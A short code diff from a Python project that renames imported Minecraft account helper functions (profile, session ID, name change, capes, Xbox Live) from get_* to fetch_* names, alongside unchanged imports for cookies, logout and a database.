@@ -28,13 +28,13 @@ from authsecuring.utils.cookies.safe_cookies import iter_cookies
 
 from authsecuring.utils.security.logout_all import logout_all
 
-from mc.get_profile import get_profile
-from mc.get_ssid import get_ssid
+from mc.get_profile import fetch_profile
+from mc.get_ssid import fetch_ssid
 
-from mc.get_namechange import get_username_info
-from mc.get_method import get_method_details
-from mc.get_capes import get_capes
-from mc.get_xbl import get_xbl
+from mc.get_namechange import fetch_namechange
+from mc.get_method import fetch_method
+from mc.get_capes import fetch_capes
+from mc.get_xbl import fetch_xbl
 from mc.retry import NoMinecraftEntitlement
 
 from storage.romeo_db import RomeoDB as DBConnection
